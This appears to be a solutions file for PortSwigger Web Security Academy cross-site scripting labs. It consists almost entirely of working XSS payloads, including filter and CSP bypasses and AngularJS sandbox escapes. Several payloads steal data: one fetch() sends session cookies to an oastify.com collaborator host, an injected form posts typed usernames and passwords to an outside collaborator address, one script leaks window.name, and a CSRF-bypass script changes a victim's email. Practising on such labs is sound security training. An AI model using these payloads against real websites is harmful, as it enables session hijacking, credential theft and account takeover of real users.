# Lab: Reflected XSS into HTML context with nothing encoded

```html
<script>alert(1)</script>
```

# Lab: DOM XSS in`innerHTML`sink using source`location.search`

```html
<img src=x onerror=alert(1) />
```

# Lab: DOM XSS in`document.write`sink using source`location.search`

```html
" onerror=alert(1) />

"><img src=x onerror=alert(1) />
```

# Lab: DOM XSS in jQuery anchor`href`attribute sink using`location.search`source

```
/feedback?returnPath=javascript:alert(document.cookie)
```

# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

```html
"onmouseover="alert(1)
```

# Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

```
javascript:alert(1)

Insert this as website link
```

# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

```
/?search=nquangit%27;alert(1);//
-> /?search=nquangit';alert(1);//

The HTML code will become:

<script>
    var searchTerms = 'nquangit';alert(1);//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

# Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

```
/product?productId=1&storeId=123<script>alert(1)</script>
```

# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

```
/?search={{$on.constructor(%27alert(1)%27)()}}

Like SSTI
```

# Lab: Reflected DOM XSS

```plaintext
eval('var searchResultsObj = ' + this.responseText);


/?search=%5C"-1alert%281%29%7D%2F%2F
-> /?search=`\"-alert(1)}//`
```

# Lab: Stored DOM XSS

```
The replace for string only repace the first string that it found.

<><img src= onerror=alert(1)>
```

# Lab: Reflected XSS into HTML context with most tags and attributes blocked

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```
We can find that the <body> element working with some attribute
The event onresize seem to be exploit by change the iframe size

Exploit server body:
<iframe src="https://0a980028046e83d3800d8f890049000a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-> <iframe src="https://0a980028046e83d3800d8f890049000a.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
```

# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

```
Exploit server body

<script>
location = 'https://0ae0009804b9bf1680ba994a008300fe.web-security-academy.net/?search=%3Cabc+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```


# Lab: Reflected XSS with some SVG markup allowed

Use the cheat-sheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Payload:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```


# Lab: Reflected XSS in canonical link tag

```
/?%27accesskey=%27x%27onclick=%27alert(1)
-> /?'accesskey='x'onclick='alert(1)
```

# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

```
Try to inject a full payload
<script>alert(1)</script>

Then we can see that the </script> match with the <script>

Final

</script><script>alert(1)</script>
```

# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

```
\'; alert(1); //

Then the code become to
var searchTerms = '\\'; alert(1); //';
```

# Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

```
var tracker={track(){}};tracker.track('https://gg.gg?&apos;-alert(1)-&apos;');

https://something?&apos;-alert(1)-&apos;
```

# Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

```
<script>
    var message = `0 search results for '\u0022\u003cscript\u003ealert(1)\u003c/script\u003e'`;
    document.getElementById('searchMessage').innerText = message;
</script>

It use the template literal in JS.
Then we can calling function or render other variable with ${command}
Payload: ${alert(1)}
```


# Lab: Exploiting cross-site scripting to steal cookies

```
Make a comment with content like below, then check the BurpSuite for Session
<script>fetch("https://6cjgxprud2owkjxclsts57mdd4jv7lva.oastify.com/"+document.cookie);</script>
```


# Lab: Exploiting cross-site scripting to capture passwords

Comment message.

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Lab: Exploiting XSS to bypass CSRF defenses

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

# Lab: Reflected XSS with AngularJS sandbox escape without strings

```
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=123
```


# Lab: Reflected XSS with AngularJS sandbox escape and CSP

```html
<!--
	Exploit Server Body
-->
<script>
document.location='https://0a0200ca0454274f80a1ad67007500bc.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

The exploit uses the `ng-focus` event in AngularJS to create a focus event that bypasses CSP. It also uses `$event`, which is an AngularJS variable that references the event object. The `path` property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the `window` object.

Normally, `|` is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the `orderBy` filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the `alert` function directly, we assign it to the variable `z`. The function will only be called when the `orderBy` operation reaches the `window` object in the `$event.path` array. This means it can be called in the scope of the window without an explicit reference to the `window` object, effectively bypassing AngularJS's `window` check.


# Lab: Reflected XSS with event handlers and `href` attributes blocked

Use the Cheat-sheet with payload
- SVG animate tag using values
We got Attribute does not allowed, then we need to modify something to work

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

# Lab: Reflected XSS in a JavaScript URL with some characters blocked

```
/post?postId=5&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

First Exploit Server body

```html
<script>
if(window.name) {
	new Image().src='//u614rdli7qike7r0fgngzvg17sdj1dp2.oastify.com?'+encodeURIComponent(window.name);
} else {
     document.location = 'https://0a83002c0380e22581464d5a00ae00d4.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a4600570355e22f811e4cf301320060.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

```html
<script>
location='https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E';
</script>
```

# Lab: Reflected XSS protected by CSP, with CSP bypass

```
/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just `script` elements. Using this directive, you can overwrite existing `script-src` rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.

